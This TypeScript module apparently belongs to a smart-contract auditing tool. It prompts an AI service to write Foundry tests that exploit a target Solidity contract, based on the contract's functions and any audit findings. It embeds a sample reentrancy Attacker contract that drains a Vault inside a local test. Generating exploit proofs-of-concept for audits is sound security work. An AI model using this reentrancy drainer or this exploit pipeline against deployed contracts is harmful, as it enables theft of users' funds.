/**
 * Attack Generator: Uses 0G AI to generate Foundry invariant tests.
 *
 * Primary path: template-based generation (JSON plan -> validated Solidity).
 * Fallback: raw Solidity generation with post-processing (legacy).
 */
import type { ProphetReport } from '../types/report.js';
import { call0GAI, is0GAvailable } from './0gService.js';
import { generateTestFromTemplate } from './templateTestGenerator.js';

const WORKING_EXAMPLE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault public immutable vault;

    constructor(address payable _vault) {
        vault = Vault(payable(_vault));
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    fallback() external payable {}
}

contract VaultTest is Test {
    Vault public vault;
    Attacker public attacker;
    address public user = address(0x1);
    address public thief = address(0x2);

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(payable(address(vault)));
        vm.deal(user, 10 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyDrain() public {
        vm.prank(user);
        vault.deposit{value: 5 ether}();
        assertEq(address(vault).balance, 5 ether);

        attacker.attack{value: 1 ether}();
        assertLt(address(vault).balance, 5 ether, "Reentrancy drained funds");
    }

    function testUnauthorizedWithdraw() public {
        vm.prank(user);
        vault.deposit{value: 2 ether}();

        vm.prank(thief);
        vm.expectRevert();
        vault.withdrawAll();
    }
}`;

const SYSTEM_PROMPT = `You are an elite white-hat smart contract security researcher writing Foundry tests.

Return ONLY valid Solidity code. No markdown, no code fences, no explanations. Start with "// SPDX-License-Identifier: MIT".

CRITICAL RULES — violations will not compile:
- The ONLY "../src/" import allowed is the target contract. ALL helper/attacker contracts MUST be defined INLINE.
- Use "address payable" for constructor params that get cast to contract types: constructor(address payable _x)
- When casting address to a contract type, wrap in payable(): MyContract(payable(addr))
- Attacker contracts that receive ETH MUST have BOTH: receive() external payable {} AND fallback() external payable {}
- receive() and fallback() have NO "function" keyword. Write: receive() external payable {} NOT function receive() ...
- Do NOT use inline assembly (assembly { ... }) — use Solidity high-level calls instead.
- Do NOT shadow state variables with function parameter names.
- Use address(0x1), address(0x2), etc. for test addresses. Do NOT use makeAddr() in helper/attacker contracts.
- IMPORTANT: The AVAILABLE FUNCTIONS listed in the prompt belong to the TARGET contract. Call them on the TARGET instance (e.g. target.deposit()), NOT on the attacker. The attacker contract only has functions YOU define inline.
- ONLY call functions that exist in the AVAILABLE FUNCTIONS list. Do NOT invent function names like withdrawAll() if only withdraw(uint256) exists.

WORKING EXAMPLE (follow this pattern exactly):
${WORKING_EXAMPLE}`;

/** Extract function/event signatures from Solidity source for the AI. */
function extractSignatures(src: string): string {
  const lines = src.split('\n');
  const sigs: string[] = [];
  for (const line of lines) {
    const trimmed = line.trim();
    if (/^function\s+\w+/.test(trimmed) || /^event\s+\w+/.test(trimmed) ||
        /^modifier\s+\w+/.test(trimmed) || /^constructor\s*\(/.test(trimmed) ||
        /^receive\(\)/.test(trimmed) || /^fallback\(\)/.test(trimmed)) {
      const sig = trimmed.replace(/\{.*$/, '').trim();
      sigs.push('  ' + sig);
    }
  }
  return sigs.length > 0 ? sigs.join('\n') : '  (no public functions found)';
}

export async function generateAttack(contractSource: string): Promise<string> {
  // Template path: JSON plan -> validated Solidity (much more reliable)
  try {
    const templateResult = await generateTestFromTemplate(contractSource);
    if (templateResult) {
      console.log('[AttackGenerator] Template-based generation succeeded');
      return templateResult;
    }
  } catch (e) {
    console.warn('[AttackGenerator] Template path failed, falling back to raw:', (e as Error).message);
  }

  // Fallback: raw Solidity generation (legacy)
  const contractName = contractSource.match(/contract\s+(\w+)/)?.[1] ?? 'Target';
  const signatures = extractSignatures(contractSource);

  const prompt = `Write a Foundry test to exploit this contract. Follow the WORKING EXAMPLE pattern exactly.

Target contract "${contractName}":
\`\`\`solidity
${contractSource}
\`\`\`

AVAILABLE FUNCTIONS (use ONLY these — do NOT call functions that aren't listed):
${signatures}

Requirements:
1. Start with: // SPDX-License-Identifier: MIT, pragma solidity ^0.8.20;, import "forge-std/Test.sol";
2. Import ONLY "../src/${contractName}.sol" — no other ../src/ imports
3. Define attacker/helper contracts INLINE (not imported)
4. One test contract: ${contractName}Test is Test { setUp(); test*(); }
5. Use address payable in constructors, payable() for casts, receive() + fallback() on attackers
6. Return ONLY the Solidity code.`;

  if (!is0GAvailable()) return generateMockAttackTest(contractSource);

  try {
    const testCode = await call0GAI(prompt, SYSTEM_PROMPT);
    return extractSolidityCode(testCode);
  } catch (e) {
    console.error('[AttackGenerator] Failed to generate attack:', e);
    return generateMockAttackTest(contractSource);
  }
}

export async function generateAttackFromReport(
  contractSource: string,
  report: ProphetReport
): Promise<string> {
  // Template path: JSON plan -> validated Solidity (much more reliable)
  try {
    const templateResult = await generateTestFromTemplate(contractSource, report);
    if (templateResult) {
      console.log('[AttackGenerator] Template-based generation (from report) succeeded');
      return templateResult;
    }
  } catch (e) {
    console.warn('[AttackGenerator] Template path failed, falling back to raw:', (e as Error).message);
  }

  // Fallback: raw Solidity generation (legacy)
  const vulnSummary =
    report.vulnerabilities.length > 0
      ? report.vulnerabilities
          .map((v) => {
            const locs = v.locations.map((l) => `${l.function} L${l.line_start}`).join(', ');
            return `- [${v.severity}] ${v.title}${locs ? ` (${locs})` : ''}: ${v.explanation}`;
          })
          .join('\n')
      : 'None listed.';
  const exploitSummary =
    report.exploit_paths.length > 0
      ? report.exploit_paths
          .map(
            (ep) =>
              `- ${ep.name}: ${ep.success_criteria}\n  Steps: ${ep.steps.map((s) => s.action).join(' -> ')}`
          )
          .join('\n')
      : 'None listed.';

  const signatures = extractSignatures(contractSource);

  const prompt = `Write a Foundry test to exploit this audited contract. Follow the WORKING EXAMPLE pattern exactly.

Target contract "${report.contract_name}":
\`\`\`solidity
${contractSource}
\`\`\`

AVAILABLE FUNCTIONS (use ONLY these — do NOT call functions that aren't listed):
${signatures}

Audit findings to exploit:
Vulnerabilities:
${vulnSummary}

Exploit paths:
${exploitSummary}

Requirements:
1. Start with: // SPDX-License-Identifier: MIT, pragma solidity ^0.8.20;, import "forge-std/Test.sol";
2. Import ONLY "../src/${report.contract_name}.sol" — no other ../src/ imports
3. Define attacker/helper contracts INLINE (not imported)
4. One test contract: ${report.contract_name}Test is Test { setUp(); test*(); }
5. Use address payable in constructors, payable() for casts, receive() + fallback() on attackers
6. Return ONLY the Solidity code.`;

  if (!is0GAvailable()) return generateMockAttackTest(contractSource, report.contract_name);

  try {
    const testCode = await call0GAI(prompt, SYSTEM_PROMPT);
    return extractSolidityCode(testCode);
  } catch (e) {
    console.error('[AttackGenerator] Failed to generate attack from report:', e);
    return generateMockAttackTest(contractSource, report.contract_name);
  }
}

function extractSolidityCode(response: string): string {
  let code = response.replace(/```solidity?\n?/g, '').replace(/```\n?/g, '');
  code = code.trim();
  if (code.startsWith('pragma') || code.startsWith('// SPDX')) return code;
  const match = code.match(/(\/\/\s*SPDX[\s\S]*)/);
  if (match) return match[1].trim();
  const pragmaMatch = code.match(/(pragma solidity[\s\S]*)/);
  if (pragmaMatch) return pragmaMatch[1].trim();
  return code;
}

function generateMockAttackTest(
  contractSource: string,
  contractNameOverride?: string
): string {
  const contractName =
    contractNameOverride ??
    (contractSource.match(/contract\s+(\w+)/)?.[1] ?? 'Target');

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/${contractName}.sol";

contract ${contractName}Test is Test {
    ${contractName} public target;

    function setUp() public {
        target = new ${contractName}();
    }

    function testPlaceholder() public view {
        assertEq(address(target) != address(0), true);
    }
}`;
}
